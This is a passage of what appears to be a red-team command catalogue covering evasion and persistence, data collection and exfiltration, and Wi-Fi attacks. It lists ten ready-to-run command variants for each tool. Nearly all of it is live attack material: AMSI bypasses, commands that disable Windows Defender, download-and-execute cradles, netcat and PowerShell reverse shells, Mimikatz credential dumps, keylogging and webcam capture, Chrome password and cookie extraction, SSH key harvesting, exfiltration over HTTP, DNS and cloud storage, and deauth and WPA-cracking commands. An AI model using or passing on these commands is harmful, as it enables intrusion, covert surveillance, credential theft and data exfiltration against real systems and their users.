| 10 | Full Evasion | `./havoc client -> payload generate --profile {profile} --arch x64 --format exe --sleep-obf --export /opt/tsec/output/8.4.10_havoc_full.exe` | EXE |

## Tool 8.5 — PowerSploit
*PowerShell modules for code execution, persistence, and evasion.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Reflective PE | `Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId {pid} > /opt/tsec/output/8.5.1_powersploit_pe.txt` | TXT |
| 2 | Shellcode Injection | `Invoke-Shellcode -Shellcode $bytes -ProcessId {pid} > /opt/tsec/output/8.5.2_powersploit_shellcode.txt` | TXT |
| 3 | Mimikatz | `Invoke-Mimikatz -DumpCreds > /opt/tsec/output/8.5.3_powersploit_mimikatz.txt` | TXT |
| 4 | Token Manipulation | `Invoke-TokenManipulation -ImpersonateUser -Username 'nt authority\system' > /opt/tsec/output/8.5.4_powersploit_token.txt` | TXT |
| 5 | WMI Persistence | `Install-Persistence -Trigger AtLogon -Payload {script} -PayloadType Script > /opt/tsec/output/8.5.5_powersploit_wmi.txt` | TXT |
| 6 | DLL Injection | `Invoke-DllInjection -ProcessID {pid} -Dll {dll_path} > /opt/tsec/output/8.5.6_powersploit_dll.txt` | TXT |
| 7 | Reverse Shell | `Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport} > /opt/tsec/output/8.5.7_powersploit_rev.txt` | TXT |
| 8 | Port Scan | `Invoke-Portscan -Hosts {target} -Ports {ports} -Threads 100 > /opt/tsec/output/8.5.8_powersploit_portscan.txt` | TXT |
| 9 | BloodHound | `Invoke-BloodHound -CollectionMethod All -ZipFileName /opt/tsec/output/8.5.9_powersploit_bloodhound.zip` | ZIP |
| 10 | Full Privesc | `Invoke-AllChecks > /opt/tsec/output/8.5.10_powersploit_allchecks.txt` | TXT |

## Tool 8.6 — AMSI/ETW/Bypass Toolkit
*Collection of techniques for bypassing Windows security controls.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | AMSI Patch | `[Ref].Assembly.GetTypes().Where({$_.Name -like '*iUtils'}).GetFields(40).SetValue($null,$true) > /opt/tsec/output/8.6.1_amsi_patch.txt` | TXT |
| 2 | ETW Patch | `[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Microsoft-Windows-PowerShell/Operational') > /opt/tsec/output/8.6.2_etw_patch.txt` | TXT |
| 3 | Forced Error | `[Ref].Assembly.GetTypes() \| ForEach-Object { if ($_.Name -like '*iUtils') { $f = $_.GetFields(40); $f[0].SetValue($null,$true) } } > /opt/tsec/output/8.6.3_amsi_forced.txt` | TXT |
| 4 | CLR Hook | `[AppDomain]::CurrentDomain.GetAssemblies().Where({$_.GlobalAssemblyCache}).GetType('AmsiUtils') > /opt/tsec/output/8.6.4_amsi_clr.txt` | TXT |
| 5 | Memory Patch | `[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').GetType('AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) > /opt/tsec/output/8.6.5_amsi_memory.txt` | TXT |
| 6 | WD Disable | `Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true > /opt/tsec/output/8.6.6_wd_disable.txt` | TXT |
| 7 | Exclusion Add | `Add-MpPreference -ExclusionPath 'C:\Temp'; Add-MpPreference -ExclusionProcess 'powershell.exe' > /opt/tsec/output/8.6.7_wd_exclude.txt` | TXT |
| 8 | Encoded Command | `powershell -enc {base64_command} > /opt/tsec/output/8.6.8_encoded.txt` | TXT |
| 9 | Download Cradle | `powershell -nop -w hidden -c 'IEX(iwr http://{lhost}/{script})' > /opt/tsec/output/8.6.9_cradle.txt` | TXT |
| 10 | Full Evasion | `[Ref].Assembly.GetTypes().Where({$_.Name -like '*iUtils'}).GetFields(40).SetValue($null,$true); IEX(iwr http://{lhost}/{payload}) > /opt/tsec/output/8.6.10_full_evasion.txt` | TXT |

## Tool 8.7 — Invoke-Obfuscation
*PowerShell command and script obfuscation framework.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Token Obfuscation | `Invoke-Obfuscation -ScriptBlock {script} -Token -Command 'Token,Member,Binary' > /opt/tsec/output/8.7.1_obfuscate_token.txt` | TXT |
| 2 | AST Obfuscation | `Invoke-Obfuscation -ScriptBlock {script} -Ast > /opt/tsec/output/8.7.2_obfuscate_ast.txt` | TXT |
| 3 | String Obfuscation | `Invoke-Obfuscation -ScriptBlock {script} -String > /opt/tsec/output/8.7.3_obfuscate_string.txt` | TXT |
| 4 | Encoding Launcher | `Invoke-Obfuscation -ScriptBlock {script} -Encoding -Command 'Encoding,Launcher' > /opt/tsec/output/8.7.4_obfuscate_encoding.txt` | TXT |
| 5 | Compression | `Invoke-Obfuscation -ScriptBlock {script} -Compress > /opt/tsec/output/8.7.5_obfuscate_compress.txt` | TXT |
| 6 | SecureString | `Invoke-Obfuscation -ScriptBlock {script} -SecureString > /opt/tsec/output/8.7.6_obfuscate_secure.txt` | TXT |
| 7 | Multi-Layer | `Invoke-Obfuscation -ScriptBlock {script} -Token -String -Encoding > /opt/tsec/output/8.7.7_obfuscate_multilayer.txt` | TXT |
| 8 | Clip Obfuscation | `Invoke-Obfuscation -ScriptBlock {script} -Clip > /opt/tsec/output/8.7.8_obfuscate_clip.txt` | TXT |
| 9 | File Obfuscation | `Invoke-Obfuscation -ScriptPath {input}.ps1 -OutputPath /opt/tsec/output/8.7.9_obfuscate_file.ps1 -Token -String` | PS1 |
| 10 | Full Pipeline | `Invoke-Obfuscation -ScriptBlock {script} -Token -Ast -String -Encoding -Compress -Launcher 'PS' > /opt/tsec/output/8.7.10_obfuscate_full.txt` | TXT |

## Tool 8.8 — Unicorn (Evasion)
*PowerShell downgrade attack and shellcode injection.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Reverse Shell | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell > /opt/tsec/output/8.8.1_unicorn_rev.ps1` | PS1 |
| 2 | Macro Attack | `python3 unicorn.py reverse_tcp {lhost} {lport} macro > /opt/tsec/output/8.8.2_unicorn_macro.txt` | TXT |
| 3 | Certutil | `python3 unicorn.py reverse_tcp {lhost} {lport} certutil > /opt/tsec/output/8.8.3_unicorn_certutil.txt` | TXT |
| 4 | Custom Shellcode | `python3 unicorn.py {shellcode_file} powershell > /opt/tsec/output/8.8.4_unicorn_custom.ps1` | PS1 |
| 5 | Custom Encoding | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell 5 > /opt/tsec/output/8.8.5_unicorn_encoded.ps1` | PS1 |
| 6 | HTA Delivery | `python3 unicorn.py reverse_tcp {lhost} {lport} hta > /opt/tsec/output/8.8.6_unicorn_hta.txt` | TXT |
| 7 | AMSI Bypass | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell --amsi > /opt/tsec/output/8.8.7_unicorn_amsi.ps1` | PS1 |
| 8 | ETW Bypass | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell --etw > /opt/tsec/output/8.8.8_unicorn_etw.ps1` | PS1 |
| 9 | Full Evasion | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell --amsi --etw > /opt/tsec/output/8.8.9_unicorn_full.ps1` | PS1 |
| 10 | Macro + HTA | `python3 unicorn.py reverse_tcp {lhost} {lport} macro_hta > /opt/tsec/output/8.8.10_unicorn_macrohta.txt` | TXT |

## Tool 8.9 — SharPersist
*Windows persistence toolkit with 15+ techniques.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Registry Run Key | `SharPersist.exe -t reg -c 'powershell.exe' -a '-ep bypass -file C:\temp\script.ps1' -k 'hkcurun' -n {name} --add > /opt/tsec/output/8.9.1_sharpersist_reg.txt` | TXT |
| 2 | Scheduled Task | `SharPersist.exe -t schtask -c 'powershell.exe' -a '-ep bypass -file C:\temp\script.ps1' -n {name} --add > /opt/tsec/output/8.9.2_sharpersist_task.txt` | TXT |
| 3 | Startup Folder | `SharPersist.exe -t startupfolder -f C:\temp\payload.exe -n {name} --add > /opt/tsec/output/8.9.3_sharpersist_startup.txt` | TXT |
| 4 | WMI Event | `SharPersist.exe -t wmi -c 'notepad.exe' -n {name} --add > /opt/tsec/output/8.9.4_sharpersist_wmi.txt` | TXT |
| 5 | Service Creation | `SharPersist.exe -t service -c 'C:\temp\payload.exe' -n {name} --add > /opt/tsec/output/8.9.5_sharpersist_service.txt` | TXT |
| 6 | Registry Check | `SharPersist.exe -t reg -k 'hkcurun' --check > /opt/tsec/output/8.9.6_sharpersist_check.txt` | TXT |
| 7 | List All | `SharPersist.exe -t all --list > /opt/tsec/output/8.9.7_sharpersist_list.txt` | TXT |
| 8 | Remove Persistence | `SharPersist.exe -t reg -n {name} --remove > /opt/tsec/output/8.9.8_sharpersist_remove.txt` | TXT |
| 9 | Time-based Trigger | `SharPersist.exe -t schtask -c 'powershell.exe' -n {name} -o logon --add > /opt/tsec/output/8.9.9_sharpersist_logon.txt` | TXT |
| 10 | Full Persistence | `SharPersist.exe -t reg -c 'powershell.exe' -a '-w hidden -enc {payload}' -k 'hkcurun' -n 'Update' --add > /opt/tsec/output/8.9.10_sharpersist_full.txt` | TXT |

## Tool 8.10 — ScareCrow
*EDR evasion payload creation with side-loading.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Binary Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery binary -o /opt/tsec/output/8.10.1_scarecrow_binary.exe` | EXE |
| 2 | Control Panel | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery control -o /opt/tsec/output/8.10.2_scarecrow_control.cpl` | CPL |
| 3 | Excel Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery excel -o /opt/tsec/output/8.10.3_scarecrow_excel.xll` | XLL |
| 4 | MSI Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery msi -o /opt/tsec/output/8.10.4_scarecrow_msi.msi` | MSI |
| 5 | DLL Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery dll -o /opt/tsec/output/8.10.5_scarecrow_dll.dll` | DLL |
| 6 | EDR Unhook | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery binary -unhook -o /opt/tsec/output/8.10.6_scarecrow_unhook.exe` | EXE |
| 7 | Custom Process | `ScareCrow -I {shellcode}.bin -domain {domain} -injection {process} -o /opt/tsec/output/8.10.7_scarecrow_inject.exe` | EXE |
| 8 | Syscall Obf | `ScareCrow -I {shellcode}.bin -domain {domain} -syscall zww -o /opt/tsec/output/8.10.8_scarecrow_syscall.exe` | EXE |
| 9 | Sandbox Evasion | `ScareCrow -I {shellcode}.bin -domain {domain} -sandbox -o /opt/tsec/output/8.10.9_scarecrow_sandbox.exe` | EXE |
| 10 | Full Evasion | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery binary -unhook -sandbox -syscall direct -o /opt/tsec/output/8.10.10_scarecrow_full.exe` | EXE |

---

# Phase 9: Actions on Objectives

> **Execute mission-critical actions to achieve engagement goals: data collection, screenshot capture, keylogging, and data exfiltration.**

---

## Tool 9.1 — rclone
*Versatile cloud storage sync tool repurposed for data exfiltration.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Cloud Upload | `rclone copy {local_path} {remote}:{bucket}/{path} > /opt/tsec/output/9.1.1_rclone_upload.txt` | TXT |
| 2 | Full Sync | `rclone sync {local_path} {remote}:{bucket} --progress > /opt/tsec/output/9.1.2_rclone_sync.txt` | TXT |
| 3 | Bandwidth Limit | `rclone copy {local_path} {remote}:{path} --bwlimit 500K > /opt/tsec/output/9.1.3_rclone_throttle.txt` | TXT |
| 4 | File Filter | `rclone copy {local_path} {remote}:{path} --include '*.pdf' --include '*.doc*' > /opt/tsec/output/9.1.4_rclone_filter.txt` | TXT |
| 5 | Encryption | `rclone copy {local_path} crypt-{remote}:{path} > /opt/tsec/output/9.1.5_rclone_encrypt.txt` | TXT |
| 6 | SFTP Transfer | `rclone copy {local_path} sftp:{remote_path} --sftp-host {host} --sftp-user {user} > /opt/tsec/output/9.1.6_rclone_sftp.txt` | TXT |
| 7 | Size Filter | `rclone copy {local_path} {remote}:{path} --min-size 1M --max-size 100M > /opt/tsec/output/9.1.7_rclone_size.txt` | TXT |
| 8 | Dry Run | `rclone copy {local_path} {remote}:{path} --dry-run -v > /opt/tsec/output/9.1.8_rclone_dryrun.txt` | TXT |
| 9 | Move Files | `rclone move {local_path} {remote}:{path} > /opt/tsec/output/9.1.9_rclone_move.txt` | TXT |
| 10 | Full Exfil | `rclone sync {sensitive_path} {remote}:{path} --include '*.{pdf,doc,docx,xls,xlsx,db,sql}' --bwlimit 1M --progress > /opt/tsec/output/9.1.10_rclone_full.txt` | TXT |

## Tool 9.2 — impacket-smbserver
*Quick SMB share for file transfer without external infrastructure.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Share | `smbserver.py -smb2support {share_name} {share_path} > /opt/tsec/output/9.2.1_smbserver_basic.log` | LOG |
| 2 | Auth Share | `smbserver.py -smb2support -username {user} -password {password} {name} {path} > /opt/tsec/output/9.2.2_smbserver_auth.log` | LOG |
| 3 | Download | `\\{lhost}\\{share}\\{file} copied to {local}` | ACTION |
| 4 | Upload Share | `smbserver.py -smb2support -comment 'Upload' upload {path} > /opt/tsec/output/9.2.4_smbserver_upload.log` | LOG |
| 5 | Specific IP | `smbserver.py -smb2support -ip {ip} {name} {path} > /opt/tsec/output/9.2.5_smbserver_ip.log` | LOG |
| 6 | Custom Port | `smbserver.py -smb2support -port 4455 {name} {path} > /opt/tsec/output/9.2.6_smbserver_port.log` | LOG |
| 7 | Debug Mode | `smbserver.py -smb2support -debug {name} {path} > /opt/tsec/output/9.2.7_smbserver_debug.log` | LOG |
| 8 | No Auth | `smbserver.py -smb2support -no-auth {name} {path} > /opt/tsec/output/9.2.8_smbserver_noauth.log` | LOG |
| 9 | Target Upload | `copy {file} \\{lhost}\\{share}\\ > /opt/tsec/output/9.2.9_smbserver_target.txt` | TXT |
| 10 | Full Transfer | `smbserver.py -smb2support -username admin -password admin -ip {ip} data /tmp/data > /opt/tsec/output/9.2.10_smbserver_full.log` | LOG |

## Tool 9.3 — netcat / ncat
*Networking utility for file transfer, reverse shells, and port scanning.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | File Receive | `nc -l -p {port} > /opt/tsec/output/9.3.1_nc_received_file.bin` | BIN |
| 2 | File Send | `nc {lhost} {port} < {file} > /opt/tsec/output/9.3.2_nc_sent.txt` | TXT |
| 3 | SSL Transfer | `ncat --ssl -l {port} --recv-only > /opt/tsec/output/9.3.3_ncat_ssl.bin` | BIN |
| 4 | Reverse Shell | `nc -e /bin/sh {lhost} {lport} > /opt/tsec/output/9.3.4_nc_revshell.txt` | TXT |
| 5 | Bind Shell | `nc -l -p {port} -e /bin/sh > /opt/tsec/output/9.3.5_nc_bindshell.txt` | TXT |
| 6 | Port Scan | `nc -zv {target} {port_start}-{port_end} > /opt/tsec/output/9.3.6_nc_scan.txt` | TXT |
| 7 | Banner Grab | `echo '' \| nc -v -w 1 {target} {port} > /opt/tsec/output/9.3.7_nc_banner.txt` | TXT |
| 8 | HTTP Request | `printf 'GET / HTTP/1.0\r\n\r\n' \| nc {target} 80 > /opt/tsec/output/9.3.8_nc_http.txt` | TXT |
| 9 | UDP Transfer | `nc -u -l -p {port} > /opt/tsec/output/9.3.9_nc_udp.bin` | BIN |
| 10 | Directory Stream | `tar czf - {directory} \| nc {lhost} {port} > /opt/tsec/output/9.3.10_nc_stream.txt` | TXT |

## Tool 9.4 — Metasploit Post-Exploitation
*Data collection, system enumeration, and targeted actions.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | File Search | `meterpreter > search -f *.pdf -d C:\\ > /opt/tsec/output/9.4.1_msf_search.txt` | TXT |
| 2 | Download File | `meterpreter > download {remote_file} {local_path} > /opt/tsec/output/9.4.2_msf_download.txt` | TXT |
| 3 | Upload File | `meterpreter > upload {local_file} {remote_path} > /opt/tsec/output/9.4.3_msf_upload.txt` | TXT |
| 4 | Screenshot | `meterpreter > screenshot -p /opt/tsec/output/9.4.4_msf_screenshot.png` | PNG |
| 5 | Keylogger | `meterpreter > keyscan_start > /opt/tsec/output/9.4.5_msf_keylog.txt` | TXT |
| 6 | Hash Dump | `meterpreter > hashdump > /opt/tsec/output/9.4.6_msf_hashdump.txt` | TXT |
| 7 | Record Mic | `meterpreter > record_mic -d 60 -f /opt/tsec/output/9.4.7_msf_audio.wav` | WAV |
| 8 | Webcam Snap | `meterpreter > webcam_snap -p /opt/tsec/output/9.4.8_msf_webcam.jpg` | JPG |
| 9 | Loot Collect | `meterpreter > loot -t files > /opt/tsec/output/9.4.9_msf_loot.txt` | TXT |
| 10 | Full Collection | `meterpreter > run post/windows/gather/enum_files; screenshot; keyscan_dump; hashdump > /opt/tsec/output/9.4.10_msf_full.txt` | TXT |

## Tool 9.5 — PowerShell Empire
*Post-exploitation agent with pure PowerShell capabilities.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Agent List | `empire > agents > /opt/tsec/output/9.5.1_empire_agents.txt` | TXT |
| 2 | Module Search | `empire > usemodule <TAB> > /opt/tsec/output/9.5.2_empire_modules.txt` | TXT |
| 3 | Keylogger | `empire > usemodule powershell/collection/keylogger; set Agent {agent}; execute > /opt/tsec/output/9.5.3_empire_keylog.txt` | TXT |
| 4 | Screenshot | `empire > usemodule powershell/collection/screenshot; set Agent {agent}; execute > /opt/tsec/output/9.5.4_empire_screenshot.txt` | TXT |
| 5 | Clipboard | `empire > usemodule powershell/collection/clipboard_monitor; set Agent {agent}; execute > /opt/tsec/output/9.5.5_empire_clipboard.txt` | TXT |
| 6 | File Finder | `empire > usemodule powershell/situational_awareness/network/powerview/find_localadmin_access; execute > /opt/tsec/output/9.5.6_empire_localadmin.txt` | TXT |
| 7 | Mimikatz | `empire > usemodule powershell/credentials/mimikatz/logonpasswords; set Agent {agent}; execute > /opt/tsec/output/9.5.7_empire_mimikatz.txt` | TXT |
| 8 | Token Enum | `empire > usemodule powershell/credentials/tokens; set Agent {agent}; execute > /opt/tsec/output/9.5.8_empire_tokens.txt` | TXT |
| 9 | File Search | `empire > shell dir C:\\Users\\ /s \| findstr '.pdf' > /opt/tsec/output/9.5.9_empire_filesearch.txt` | TXT |
| 10 | Full Operation | `empire > usemodule powershell/collection/keylogger; usemodule powershell/collection/screenshot; usemodule powershell/credentials/mimikatz/logonpasswords; execute > /opt/tsec/output/9.5.10_empire_full.txt` | TXT |

## Tool 9.6 — Unix Text Processing Toolkit
*Core utilities for parsing logs and searching for sensitive data.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Credential Search | `grep -ri 'password\|passwd\|pwd' {directory} 2>/dev/null > /opt/tsec/output/9.6.1_grep_creds.txt` | TXT |
| 2 | Config Parse | `grep -E '^(user\|pass\|host\|port\|key)' {config_file} > /opt/tsec/output/9.6.2_grep_config.txt` | TXT |
| 3 | Log Extract | `awk '/{pattern}/{print $0}' {log_file} > /opt/tsec/output/9.6.3_awk_logs.txt` | TXT |
| 4 | CSV Process | `awk -F',' '{print $1, $3}' {csv_file} > /opt/tsec/output/9.6.4_awk_csv.txt` | TXT |
| 5 | Config Discovery | `find {directory} -type f \( -name '*.conf' -o -name '*.ini' -o -name '*.xml' \) > /opt/tsec/output/9.6.5_find_configs.txt` | TXT |
| 6 | DB Search | `find {directory} -name '*.db' -o -name '*.sql' -o -name '*.sqlite' > /opt/tsec/output/9.6.6_find_dbs.txt` | TXT |
| 7 | History Collect | `cat /home/*/.bash_history /root/.bash_history 2>/dev/null > /opt/tsec/output/9.6.7_history.txt` | TXT |
| 8 | SSH Key Harvest | `find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null > /opt/tsec/output/9.6.8_ssh_keys.txt` | TXT |
| 9 | Sensitive Pattern | `grep -r -l -i 'BEGIN OPENSSH PRIVATE KEY\|BEGIN RSA PRIVATE KEY\|AKIA' {path} > /opt/tsec/output/9.6.9_grep_sensitive.txt` | TXT |
| 10 | Data Sweep | `find {directory} -type f \( -name '*.pdf' -o -name '*.doc*' -o -name '*.xls*' \) -exec cp {} {staging}/ + > /opt/tsec/output/9.6.10_full_sweep.txt` | TXT |

## Tool 9.7 — curl / wget
*HTTP clients for data exfiltration through HTTP/HTTPS.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | File Upload | `curl -F 'file=@{file}' http://{lhost}:{port}/upload > /opt/tsec/output/9.7.1_curl_upload.txt` | TXT |
| 2 | PUT Upload | `curl -T {file} http://{lhost}:{port}/{path} > /opt/tsec/output/9.7.2_curl_put.txt` | TXT |
| 3 | Data POST | `curl -X POST -d '{data}' http://{lhost}:{port}/receive > /opt/tsec/output/9.7.3_curl_post.txt` | TXT |
| 4 | Base64 Transfer | `cat {file} \| base64 \| curl -X POST -d @- http://{lhost}:{port}/ > /opt/tsec/output/9.7.4_curl_base64.txt` | TXT |
| 5 | HTTPS Upload | `curl -k -F 'file=@{file}' https://{lhost}:{port}/upload > /opt/tsec/output/9.7.5_curl_https.txt` | TXT |
| 6 | WGET Upload | `wget --post-file={file} http://{lhost}:{port}/receive > /opt/tsec/output/9.7.6_wget_upload.txt` | TXT |
| 7 | Chunked Upload | `curl --limit-rate 100K -F 'file=@{file}' http://{lhost}:{port}/upload > /opt/tsec/output/9.7.7_curl_throttle.txt` | TXT |
| 8 | Custom Header | `curl -H 'X-Data: secret' -F 'file=@{file}' http://{lhost}:{port}/ > /opt/tsec/output/9.7.8_curl_header.txt` | TXT |
| 9 | Proxy Upload | `curl -x http://{proxy}:{port} -F 'file=@{file}' http://{lhost}/upload > /opt/tsec/output/9.7.9_curl_proxy.txt` | TXT |
| 10 | Full Pipeline | `tar czf - {directory} \| base64 \| curl -X POST -d @- http://{lhost}:{port}/exfil > /opt/tsec/output/9.7.10_curl_full.txt` | TXT |

## Tool 9.8 — DNSExfiltrator
*Covert data exfiltration through DNS queries.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | File DNS Exfil | `python3 dns-exfiltrator.py -f {file} -d {domain} -n {nameserver} > /opt/tsec/output/9.8.1_dns_exfil.txt` | TXT |
| 2 | String Exfil | `python3 dns-exfiltrator.py -s '{data}' -d {domain} -n {nameserver} > /opt/tsec/output/9.8.2_dns_string.txt` | TXT |
| 3 | Iodine Tunnel | `iodine -f -P {password} {nameserver} {domain} > /opt/tsec/output/9.8.3_iodine_tunnel.txt` | TXT |
| 4 | Iodine Server | `iodined -f -P {password} -c {tun_ip} {domain} > /opt/tsec/output/9.8.4_iodined_server.txt` | TXT |
| 5 | Chunked Transfer | `python3 dns-exfiltrator.py -f {file} -d {domain} -c 50 > /opt/tsec/output/9.8.5_dns_chunked.txt` | TXT |
| 6 | Base32 Encoding | `python3 dns-exfiltrator.py -f {file} -d {domain} -b > /opt/tsec/output/9.8.6_dns_base32.txt` | TXT |
| 7 | Reverse Tunnel | `iodine -r -P {password} {nameserver} {domain} > /opt/tsec/output/9.8.7_iodine_reverse.txt` | TXT |
| 8 | Throughput Test | `python3 dns-exfiltrator.py -f /dev/zero -s 10M -d {domain} > /opt/tsec/output/9.8.8_dns_throughput.txt` | TXT |
| 9 | Encrypted Tunnel | `iodine -f -P {password} -T TXT {nameserver} {domain} > /opt/tsec/output/9.8.9_iodine_encrypted.txt` | TXT |
| 10 | Full Exfil Chain | `cat {sensitive_file} \| gzip \| base64 \| python3 dns-exfiltrator.py -s - -d {domain} -n {ns} > /opt/tsec/output/9.8.10_dns_full.txt` | TXT |

## Tool 9.9 — sqlite3
*Command-line interface for SQLite database extraction.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | List Tables | `sqlite3 {database}.db '.tables' > /opt/tsec/output/9.9.1_sqlite3_tables.txt` | TXT |
| 2 | Table Schema | `sqlite3 {database}.db '.schema {table}' > /opt/tsec/output/9.9.2_sqlite3_schema.txt` | TXT |
| 3 | Data Dump | `sqlite3 {database}.db 'SELECT * FROM {table}' > /opt/tsec/output/9.9.3_sqlite3_dump.txt` | TXT |
| 4 | Chrome Passwords | `sqlite3 'Login Data' 'SELECT origin_url, username_value FROM logins' > /opt/tsec/output/9.9.4_sqlite3_chrome.txt` | TXT |
| 5 | Cookie Extract | `sqlite3 'Cookies' 'SELECT host_key, name, value FROM cookies' > /opt/tsec/output/9.9.5_sqlite3_cookies.txt` | TXT |
| 6 | CSV Export | `sqlite3 {database}.db '.mode csv' 'SELECT * FROM {table}' > /opt/tsec/output/9.9.6_sqlite3_{table}.csv` | CSV |
| 7 | Full Dump | `sqlite3 {database}.db '.dump' > /opt/tsec/output/9.9.7_sqlite3_full.sql` | SQL |
| 8 | Conditional Query | `sqlite3 {database}.db 'SELECT * FROM {table} WHERE {column} LIKE "%pass%"' > /opt/tsec/output/9.9.8_sqlite3_search.txt` | TXT |
| 9 | Find All DBs | `find /home -name '*.sqlite' -o -name '*.db' 2>/dev/null \| xargs -I {} sqlite3 {} '.tables' > /opt/tsec/output/9.9.9_sqlite3_findall.txt` | TXT |
| 10 | CSV with Headers | `sqlite3 {database}.db '.mode csv' '.headers on' 'SELECT * FROM {table}' > /opt/tsec/output/9.9.10_sqlite3_headers.csv` | CSV |

## Tool 9.10 — find + zip/tar
*File discovery and compression for efficient exfiltration.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Find PDFs | `find {directory} -type f -name '*.pdf' > /opt/tsec/output/9.10.1_find_pdfs.txt` | TXT |
| 2 | Archive Directory | `tar czf /opt/tsec/output/9.10.2_archive_{name}.tar.gz -C {directory} .` | TAR.GZ |
| 3 | Selective Archive | `find {directory} -name '*.doc' -o -name '*.pdf' \| tar czf /opt/tsec/output/9.10.3_selective.tar.gz -T -` | TAR.GZ |
| 4 | Size Filter | `find {directory} -type f -size +1M -size -100M > /opt/tsec/output/9.10.4_find_size.txt` | TXT |
| 5 | Recent Files | `find {directory} -type f -mtime -7 > /opt/tsec/output/9.10.5_find_recent.txt` | TXT |
| 6 | SSH Key Collect | `find /home -type f \( -name 'id_rsa' -o -name '*.pem' \) 2>/dev/null > /opt/tsec/output/9.10.6_find_sshkeys.txt` | TXT |
| 7 | Database Files | `find {directory} -type f \( -name '*.db' -o -name '*.sqlite' -o -name '*.sql' \) > /opt/tsec/output/9.10.7_find_dbs.txt` | TXT |
| 8 | Config Harvest | `find {directory} -type f \( -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '*.xml' -o -name '*.env' \) > /opt/tsec/output/9.10.8_find_configs.txt` | TXT |
| 9 | Exclude Archive | `tar czf /opt/tsec/output/9.10.9_archive_clean.tar.gz --exclude='node_modules' --exclude='.git' {directory}` | TAR.GZ |
| 10 | Full Collection | `find {directory} -type f \( -name '*.pdf' -o -name '*.doc*' -o -name '*.xls*' -o -name '*.db' \) -exec tar czf /opt/tsec/output/9.10.10_full_collection.tar.gz {} +` | TAR.GZ |

---

# Phase 10: Wireless Hacking

> **Assess wireless network security across Wi-Fi, Bluetooth, and RF protocols. Capture handshakes, crack encryption, and deploy rogue access points.**

---

## Tool 10.1 — Aircrack-ng
*Complete suite for Wi-Fi network security assessment.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Monitor Mode | `airmon-ng start {interface} > /opt/tsec/output/10.1.1_aircrack_monitor.txt` | TXT |
| 2 | Network Scan | `airodump-ng {interface_mon} --write /opt/tsec/output/10.1.2_aircrack_scan` | CAP |
| 3 | Targeted Capture | `airodump-ng -c {channel} --bssid {bssid} -w /opt/tsec/output/10.1.3_aircrack_target {interface_mon}` | CAP |
| 4 | Deauth Attack | `aireplay-ng -0 {count} -a {bssid} -c {client_mac} {interface_mon} > /opt/tsec/output/10.1.4_aircrack_deauth.txt` | TXT |
| 5 | WPA Cracking | `aircrack-ng -w {wordlist} -b {bssid} /opt/tsec/output/10.1.3_aircrack_target-01.cap > /opt/tsec/output/10.1.5_aircrack_crack.txt` | TXT |
| 6 | WEP Injection | `aireplay-ng -3 -b {bssid} -h {mac} {interface_mon} > /opt/tsec/output/10.1.6_aircrack_wep.txt` | TXT |
| 7 | Fake Auth | `aireplay-ng -1 0 -a {bssid} -h {mac} {interface_mon} > /opt/tsec/output/10.1.7_aircrack_fakeauth.txt` | TXT |
| 8 | Packet Forge | `packetforge-ng -0 -a {bssid} -h {mac} -k {ip_dst} -l {ip_src} -y {prga} -w /opt/tsec/output/10.1.8_aircrack_forge.cap` | CAP |
| 9 | PMKID Capture | `hcxdumptool -i {interface} -o /opt/tsec/output/10.1.9_aircrack_pmkid.pcapng --enable_status=1` | PCAPNG |
| 10 | Full WPA Audit | `airmon-ng start {iface} && airodump-ng -c {ch} --bssid {bssid} -w /opt/tsec/output/10.1.10_aircrack_full {iface_mon} & aireplay-ng -0 10 -a {bssid} -c {client} {iface_mon}` | CAP |

## Tool 10.2 — Wifite2
*Automated wireless attack tool for WEP, WPA, and WPS.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Auto Attack | `wifite --kill --cracked > /opt/tsec/output/10.2.1_wifite_auto.txt` | TXT |
| 2 | WPA Only | `wifite -i {interface} --wpa --dict {wordlist} > /opt/tsec/output/10.2.2_wifite_wpa.txt` | TXT |
| 3 | WPS Attack | `wifite -i {interface} --wps --pixie > /opt/tsec/output/10.2.3_wifite_wps.txt` | TXT |
| 4 | PMKID Only | `wifite -i {interface} --pmkid --dict {wordlist} > /opt/tsec/output/10.2.4_wifite_pmkid.txt` | TXT |
| 5 | Custom Dict | `wifite -i {interface} --dict {wordlist} > /opt/tsec/output/10.2.5_wifite_dict.txt` | TXT |
